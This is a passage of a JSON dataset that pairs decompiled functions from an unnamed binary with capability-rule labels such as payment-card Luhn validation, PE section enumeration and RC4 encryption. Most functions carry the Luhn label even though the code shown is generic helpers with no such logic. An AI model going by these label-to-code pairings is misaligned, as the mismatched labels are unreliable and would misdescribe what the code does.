    "0002bf10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bf10(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b910();\n    fcn.0007866a(arg_8h, arg_ch, 0xb1be1630, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 95
    },
    "0002bf40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bf40(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b9d0();\n    fcn.0007866a(arg_8h, arg_ch, 0xb1be169c, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 97
    },
    "0002bf70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bf70(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002ba30(arg_ch);\n    fcn.00078652(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 85
    },
    "0002bfa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bfa0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002ba90(arg_ch);\n    fcn.00078652(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 86
    },
    "0002bfd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bfd0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002baf0(arg_ch);\n    fcn.00078652(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 86
    },
    "0002c000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c000(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002bb50(arg_ch);\n    fcn.00078652(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 85
    },
    "0002c440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c440(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    fcn.00034550(0xb1c59f2c);\n    iVar1 = fcn.00023560(0xfffffffe, 8, &var_4h, &var_ch);\n    if (iVar1 == 0) {\n        for (var_8h = 0; var_8h < var_4h; var_8h = var_8h + 1) {\n            if ((*(var_ch + 0x10 + var_8h * 0x40) == arg_8h) || (*(var_ch + 0x1c + var_8h * 0x40) == arg_8h)) {\n                if (*(var_ch + 0x10 + var_8h * 0x40) == arg_8h) {\n                    fcn.000237c0(*(var_ch + var_8h * 0x40), *(var_ch + 8 + var_8h * 0x40), *(var_ch + 4 + var_8h * 0x40)\n                                 , 0, 0);\n                }\n                else {\n                    fcn.000237c0(*(var_ch + var_8h * 0x40), *(var_ch + 8 + var_8h * 0x40), *(var_ch + 4 + var_8h * 0x40)\n                                 , 3, 0);\n                }\n                fcn.0002c370(*(var_ch + 0xc + var_8h * 0x40));\n            }\n        }\n    }\n    fcn.000345c0(0xb1c59f2c);\n    fcn.00023800(var_ch);\n    return;\n}\n",
        "token_count": 433
    },
    "000334e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000334e0(int32_t arg_8h)\n\n{\n    fcn.00035330(*(arg_8h + 4));\n    return;\n}\n",
        "token_count": 40
    },
    "00034ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00034ec0(char *arg_8h, int32_t arg_ch)\n\n{\n    char *var_4h;\n    \n    var_4h = NULL;\n    for (; *arg_8h != '\\0'; arg_8h = arg_8h + 1) {\n        if (*arg_8h == arg_ch) {\n            var_4h = arg_8h;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 104
    },
    "00034f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00034f00(char *arg_8h)\n\n{\n    int32_t var_4h;\n    \n    var_4h = 0;\n    for (; *arg_8h != '\\0'; arg_8h = arg_8h + 1) {\n        var_4h = var_4h + 1;\n    }\n    return var_4h;\n}\n",
        "token_count": 90
    },
    "000354e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.000354e0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    bool bVar3;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_1h;\n    \n    (**0xb1bde00c)();\n    var_10h = 0xffffffff;\n    var_ch = 0;\n    var_18h = 0;\n    for (var_14h = 0; var_14h < 100; var_14h = var_14h + 1) {\n        uVar1 = *(var_14h * 0x10 + -0x4e3a606c);\n        if ((uVar1 <= var_ch) && ((uVar1 < var_ch || (*(var_14h * 0x10 + -0x4e3a6070) < var_10h)))) {\n            var_10h = *(var_14h * 0x10 + -0x4e3a6070);\n            var_ch = *(var_14h * 0x10 + -0x4e3a606c);\n            var_18h = var_14h;\n        }\n    }\n    uVar2 = fcn.000786b8();\n    *(var_18h * 0x10 + -0x4e3a6078) = uVar2;\n    *(var_18h * 0x10 + -0x4e3a6074) = arg_8h;\n    *(var_18h * 0x10 + -0x4e3a6070) = *0xb1c5b3c8;\n    *(var_18h * 0x10 + -0x4e3a606c) = *0xb1c5b3cc;\n    bVar3 = 0xfffffffe < *0xb1c5b3c8;\n    *0xb1c5b3c8 = *0xb1c5b3c8 + 1;\n    *0xb1c5b3cc = *0xb1c5b3cc + bVar3;\n    if ((*0xb1c5b3c8 | *0xb1c5b3cc) == 0) {\n        for (var_14h = 0; var_14h < 100; var_14h = var_14h + 1) {\n            *(var_14h * 0x10 + -0x4e3a6070) = 0;\n            *(var_14h * 0x10 + -0x4e3a606c) = 0;\n        }\n    }\n    (**0xb1bde010)();\n    return;\n}\n",
        "token_count": 649
    },
    "00035620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.00035620(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_ch = 0xffffffff;\n    (**0xb1bde00c)();\n    var_8h = 0;\n    do {\n        if (99 < var_8h) {\ncode_r0x0003567a:\n            (**0xb1bde010)();\n            return var_ch;\n        }\n        iVar1 = fcn.000786b8();\n        if (*(var_8h * 0x10 + -0x4e3a6078) == iVar1) {\n            var_ch = *(var_8h * 0x10 + -0x4e3a6074);\n            goto code_r0x0003567a;\n        }\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 221
    },
    "00036820": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00036820(uint32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = (**0xb1bde1b8)();\n    var_4h = 0;\n    do {\n        if (0x2fff < var_4h) {\ncode_r0x00036870:\n            (**0xb1bde0e8)(0);\n            return;\n        }\n        iVar2 = fcn.000785c8(0xb1be1800, iVar1 + var_4h, 6);\n        if (iVar2 == 0) {\n            *arg_8h = var_4h;\n            goto code_r0x00036870;\n        }\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 202
    },
    "00036a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00036a10(uint *arg_8h)\n\n{\n    uint uVar1;\n    \n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    uVar1 = fcn.00035230(0x48);\n    arg_8h[3] = uVar1;\n    (**0xb1bde1a0)(arg_8h[3] + 0x28, 0);\n    (**0xb1bde1d4)(arg_8h[3], 0, 0x7fffffff);\n    (**0xb1bde1d4)(arg_8h[3] + 0x14, 0, 0x7fffffff);\n    return;\n}\n",
        "token_count": 192
    },
    "00037500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037500(uint arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    char *var_4h;\n    \n    uVar1 = fcn.00035eb0(arg_8h, &var_4h, 0x10);\n    *arg_ch = uVar1;\n    if (*var_4h == '.') {\n        uVar1 = fcn.00035eb0(var_4h + 1, &var_4h, 0x10);\n        arg_ch[1] = uVar1;\n    }\n    else {\n        arg_ch[1] = 0;\n    }\n    return 1;\n}\n",
        "token_count": 149
    },
    "00037b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037b20(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0007861c(arg_8h, 0xb1be1808);\n    if ((((iVar1 != 0) && (iVar1 = fcn.0007861c(arg_8h, 0xb1be1818),  iVar1 != 0)) &&\n        (iVar1 = fcn.0007861c(arg_8h, 0xb1be1824),  iVar1 != 0)) &&\n       (((iVar1 = fcn.0007861c(arg_8h, 0xb1be1830),  iVar1 != 0 &&\n         (iVar1 = fcn.0007861c(arg_8h, 0xb1be1840),  iVar1 != 0)) &&\n        (iVar1 = fcn.0007861c(arg_8h, 0xb1be184c),  iVar1 != 0)))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 243
    },
    "00037bc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037bc0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00078580(arg_8h, 0xb1be1858);\n    if ((((iVar1 != 0) && (iVar1 = fcn.00078580(arg_8h, 0xb1be1874),  iVar1 != 0)) &&\n        (iVar1 = fcn.00078580(arg_8h, 0xb1be188c),  iVar1 != 0)) &&\n       (((iVar1 = fcn.00078580(arg_8h, 0xb1be18a0),  iVar1 != 0 &&\n         (iVar1 = fcn.00078580(arg_8h, 0xb1be18bc),  iVar1 != 0)) &&\n        (iVar1 = fcn.00078580(arg_8h, 0xb1be18d4),  iVar1 != 0)))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 239
    },
    "0003c4e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0003c4e0(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    for (var_4h = 0; var_4h < 100; var_4h = var_4h + 1) {\n        iVar1 = fcn.0003da90(var_4h, 0);\n        if (iVar1 != 0) {\n            var_8h = fcn.0003c530(var_4h);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 139
    },
    "0003cf90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003cf90(int32_t arg_8h)\n\n{\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    fcn.00037150(0xb1c68588, &var_4h, 1);\n    var_8h = 0;\n    do {\n        if (*0xb1c68580 <= var_8h) {\ncode_r0x0003cff6:\n            fcn.00037180(0xb1c68588, &var_4h, 1);\n            return var_ch;\n        }\n        if (*(*0xb1c68584 + 0xc + var_8h * 0x10) == arg_8h) {\n            var_ch = *(*0xb1c68584 + 4 + var_8h * 0x10);\n            goto code_r0x0003cff6;\n        }\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 232
    },
    "0003da30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003da30(void)\n\n{\n    fcn.00078790(0xb1c5b4b8, 0, 0x34);\n    fcn.00036f50(0xb1c5b4c0);\n    fcn.0003eea0();\n    return;\n}\n",
        "token_count": 70
    },
    "00040010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00040010(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    while( true ) {\n        if (arg_ch <= var_8h) {\n            return 0;\n        }\n        cVar1 = (**0xb1bde208)(arg_8h + var_8h);\n        if (cVar1 == '\\0') break;\n        if (*(arg_8h + var_8h) == arg_10h) {\n            return var_8h;\n        }\n        var_8h = var_8h + 4;\n    }\n    return 0;\n}\n",
        "token_count": 183
    },
    "00040f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00040f30(uchar *arg_8h, uint *arg_ch)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0x240022;\n    var_4h = 0xb1be2004;\n    *arg_ch = 0;\n    fcn.00078790(arg_8h, 0, 0x6c);\n    *arg_8h = 5;\n    arg_8h[1] = 1;\n    *(arg_8h + 0x30) = var_8h;\n    *(arg_8h + 0x34) = var_4h;\n    *(arg_8h + 8) = 0xb1c0e040;\n    *(arg_8h + 0xc) = 0xb1c0e060;\n    *(arg_8h + 0x10) = 0xb1c0e080;\n    *(arg_8h + 0x14) = 0xb1c0e0a0;\n    *(arg_8h + 0x18) = 0xb1c0e0c0;\n    *(arg_8h + 0x1c) = 0xb1c0e0e0;\n    *(arg_8h + 0x20) = 0xb1c0e100;\n    *(arg_8h + 0x24) = 0xb1c0e120;\n    *(arg_8h + 0x28) = 0xb1c0e140;\n    *(arg_8h + 0x2c) = 0xb1c0e160;\n    *(arg_8h + 0x38) = 0xb1c0e1c0;\n    *(arg_8h + 0x3c) = 0xb1c0e180;\n    *(arg_8h + 0x40) = 0xb1c0e1a0;\n    *(arg_8h + 0x48) = 0;\n    *(arg_8h + 0x44) = 0xb1c0e1e0;\n    (**0xb1bde02c)(&var_ch, arg_ch, arg_8h, 0x6c);\n    return var_ch;\n}\n",
        "token_count": 528
    },
    "00041fd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00041fd0(uint arg_8h, uint noname_1, uchar *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00078790(arg_10h, 0, 0x68);\n    *arg_10h = 0x8b;\n    *(arg_10h + 2) = 0x68;\n    arg_10h[1] = 1;\n    arg_10h[4] = 6;\n    arg_10h[5] = 0;\n    arg_10h[6] = 1;\n    arg_10h[7] = 0;\n    *(arg_10h + 8) = 0;\n    fcn.00078550(&var_8h, 0xb1c58728);\n    *(arg_10h + 0xc) = var_8h;\n    *(arg_10h + 0x10) = var_4h;\n    fcn.00078550(&var_10h, 0xb1c58728);\n    *(arg_10h + 0x14) = var_10h;\n    *(arg_10h + 0x18) = var_ch;\n    fcn.00078550(&var_18h, 0xb1c58778);\n    *(arg_10h + 0x1c) = var_18h;\n    *(arg_10h + 0x20) = var_14h;\n    *(arg_10h + 0x24) = 0xb1c0f150;\n    *(arg_10h + 0x2c) = 0xb1c0f170;\n    *(arg_10h + 0x30) = 0xb1c0f1d0;\n    *(arg_10h + 0x34) = 0xb1c0f1b0;\n    *(arg_10h + 0x38) = 0xb1c0f190;\n    *(arg_10h + 0x28) = 0xb1c0f350;\n    *(arg_10h + 0x50) = 0xb1c0f1f0;\n    *(arg_10h + 0x54) = 0xb1c0f230;\n    *(arg_10h + 0x58) = 0xb1c0f210;\n    *(arg_10h + 0x3c) = 0xb1c0f2d0;\n    *(arg_10h + 0x4c) = 0xb1c0f2f0;\n    *(arg_10h + 0x40) = 0xb1c0f2b0;\n    *(arg_10h + 0x48) = 0xb1c0f310;\n    *(arg_10h + 0x5c) = 0xb1c0f270;\n    *(arg_10h + 0x60) = 0xb1c0f290;\n    *(arg_10h + 100) = 0xb1c0f250;\n    *(arg_10h + 0x44) = 0xb1c0f330;\n    uVar1 = (**0xb1c685c4)(arg_8h, arg_10h, arg_10h, arg_14h);\n    return uVar1;\n}\n",
        "token_count": 812
    },
    "00042870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00042870(uint arg_8h, uint noname_1, uchar *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00078550(&var_ch, 0xb1be1764);\n    fcn.00078790(arg_10h, 0, 0x48);\n    *arg_10h = 0x8a;\n    *(arg_10h + 2) = 0x48;\n    arg_10h[1] = 1;\n    arg_10h[4] = 6;\n    arg_10h[5] = 0;\n    arg_10h[6] = 6;\n    arg_10h[7] = 0;\n    *(arg_10h + 0xc) = 0xb1c0f9b0;\n    *(arg_10h + 0x10) = 0xb1c0f9d0;\n    *(arg_10h + 0x14) = 0xb1c0f990;\n    *(arg_10h + 0x18) = 0xb1c0f9f0;\n    *(arg_10h + 0x1c) = 0xb1c0fa10;\n    *(arg_10h + 0x20) = 0xb1c0fb50;\n    *(arg_10h + 0x24) = 0xb1c0fa30;\n    *(arg_10h + 0x28) = 0xb1c0fa50;\n    *(arg_10h + 0x2c) = 0xb1c0fa70;\n    *(arg_10h + 0x30) = 0xb1c0fa90;\n    *(arg_10h + 0x3c) = 0xb1c0fab0;\n    *(arg_10h + 0x40) = 0xb1c0fad0;\n    *(arg_10h + 0x34) = 0xb1c0faf0;\n    *(arg_10h + 0x38) = 0xb1c0fb10;\n    *(arg_10h + 0x44) = 0xb1c0fb30;\n    uVar1 = (**0xb1c685b0)(arg_8h, &var_ch, arg_14h, arg_10h, 0xb1c5b5a4);\n    return uVar1;\n}\n",
        "token_count": 572
    },
    "00042ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00042ef0(uint arg_8h, uint noname_1, uchar *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00078550(&var_ch, 0xb1be1764);\n    fcn.00078790(arg_10h, 0, 0x50);\n    *arg_10h = 0x8a;\n    *(arg_10h + 2) = 0x50;\n    arg_10h[1] = 2;\n    arg_10h[4] = 6;\n    arg_10h[5] = 0x14;\n    arg_10h[6] = 6;\n    arg_10h[7] = 0x14;\n    *(arg_10h + 0xc) = 0xb1c10040;\n    *(arg_10h + 0x10) = 0xb1c10060;\n    *(arg_10h + 0x14) = 0xb1c10020;\n    *(arg_10h + 0x18) = 0xb1c10080;\n    *(arg_10h + 0x1c) = 0xb1c100a0;\n    *(arg_10h + 0x20) = 0xb1c101e0;\n    *(arg_10h + 0x24) = 0xb1c100c0;\n    *(arg_10h + 0x28) = 0xb1c100e0;\n    *(arg_10h + 0x2c) = 0xb1c10100;\n    *(arg_10h + 0x30) = 0xb1c10120;\n    *(arg_10h + 0x3c) = 0xb1c10140;\n    *(arg_10h + 0x40) = 0xb1c10160;\n    *(arg_10h + 0x34) = 0xb1c10180;\n    *(arg_10h + 0x38) = 0xb1c101a0;\n    *(arg_10h + 0x44) = 0xb1c101c0;\n    *(arg_10h + 0x48) = 0xb1c10200;\n    *(arg_10h + 0x4c) = 0xb1c10220;\n    uVar1 = (**0xb1c685b0)(arg_8h, &var_ch, arg_14h, arg_10h, 0xb1c5b5a8);\n    return uVar1;\n}\n",
        "token_count": 605
    },
    "000445c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000445c0(uint arg_8h, uint *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    var_44h = 0;\n    fcn.00078790(&var_40h, 0, 0x38);\n    var_8h = arg_14h;\n    var_4h = arg_18h;\n    var_44h = *arg_ch;\n    var_40h = arg_ch[1];\n    var_3ch = arg_ch[2];\n    var_38h = arg_ch[3];\n    var_34h = arg_14h;\n    var_30h = arg_18h;\n    var_1ch = *arg_10h;\n    var_18h = arg_10h[1];\n    var_14h = arg_10h[2];\n    var_10h = arg_10h[3];\n    (**0xb1c5b450)(arg_8h, &var_44h, 0, 0);\n    return;\n}\n",
        "token_count": 344
    },
    "00045700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00045700(uint arg_8h)\n\n{\n    fcn.00037a60();\n    fcn.00035330(arg_8h);\n    return 0;\n}\n",
        "token_count": 44
    },
    "00045ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00045ab0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00045e60(*(arg_8h + 0x640), *(arg_8h + 0x644), *(arg_8h + 0x63c));\n    (**0xb1bde0c0)(arg_8h + 0x688, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 114
    },
    "00046f70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00046f70(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    \n    var_10h = 0;\n    iVar1 = fcn.00046fd0(arg_8h, arg_ch, &var_10h, &var_ch, &var_8h, 0, 0);\n    if ((iVar1 == 0) || (var_ch < 8)) {\n        var_18h = 0;\n    }\n    else {\n        var_18h = 1;\n    }\n    fcn.00035330(var_10h);\n    return var_18h;\n}\n",
        "token_count": 178
    },
    "0004cb30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004cb30(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    *arg_14h = 0;\n    iVar2 = fcn.00020650(arg_10h, 0x1a, 2, &var_18h, 4);\n    if (iVar2 == 0) {\n        uVar3 = 0x21590065;\n    }\n    else {\n        iVar2 = fcn.0003da90(var_18h, 0);\n        if (iVar2 == 0) {\n            uVar3 = 0x21590065;\n        }\n        else {\n            iVar2 = fcn.000205e0(arg_10h, 0x2c, 4, &var_10h, 0);\n            if ((iVar2 != 0) && (cVar1 = fcn.0004db20(var_10h, &var_20h),  cVar1 != '\\0')) {\n                iVar2 = fcn.000205e0(arg_10h, 0x2d, 4, &var_14h, 0);\n                if ((iVar2 == 0) || (cVar1 = fcn.0004db20(var_14h, &var_4h),  cVar1 == '\\0')) {\n                    return 0x21590067;\n                }\n                var_5h = (**0xb1bde00c)();\n                var_1ch = 0x21590005;\n                var_ch = 0;\n                do {\n                    if (0x3f < var_ch) {\ncode_r0x0004cc43:\n                        (**0xb1bde010)();\n                        return var_1ch;\n                    }\n                    if (*(var_ch * 0x30 + -0x4e398848) == var_18h) {\n                        *(var_ch * 0x30 + -0x4e398848) = 0;\n                        fcn.000340b0(0xb1c67794);\n                        var_1ch = 0;\n                        goto code_r0x0004cc43;\n                    }\n                    var_ch = var_ch + 1;\n                } while( true );\n            }\n            uVar3 = 0x21590066;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 598
    },
    "0004d290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0004d290(uint noname_0, int32_t *arg_ch)\n\n{\n    uint var_4h;\n    \n    fcn.00034080(*arg_ch + 0x3c);\n    (**0xb1bde2ac)(arg_ch[1]);\n    (**0xb1bde060)(*arg_ch);\n    return;\n}\n",
        "token_count": 81
    },
    "000504c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000504c0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uchar uVar1;\n    uint var_10h;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    for (var_8h = 0; var_8h < arg_10h; var_8h = var_8h + 1) {\n        uVar1 = *(arg_8h + var_8h);\n        *(arg_8h + var_8h) = *(arg_ch + var_8h);\n        *(arg_ch + var_8h) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "000509b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000509b0(int32_t arg_8h)\n\n{\n    uint var_18h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(arg_8h + 0xc) + 0xe;\n    var_8h = *(*(arg_8h + 0xc) + 0x1a);\n    fcn.0007865e(&var_18h, 0xb1be2580, var_8h & 0xff, var_8h >> 8 & 0xff, var_8h >> 0x10 & 0xff, var_8h >> 0x18);\n    fcn.00048b50(*(arg_8h + 0x14), *(arg_8h + 0x18), &var_18h, 0, 0);\n    return;\n}\n",
        "token_count": 204
    },
    "000510f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.000510f0(uint arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t arg_8h_00;\n    code *pcVar1;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    while (var_4h < arg_14h) {\n        arg_8h_00 = *(arg_10h + var_4h * 4);\n        fcn.00052800(arg_8h_00);\n        var_4h = arg_8h_00 + 1;\n    }\n    pcVar1 = fcn.000639f0(arg_8h);\n    (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 204
    },
    "000517b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
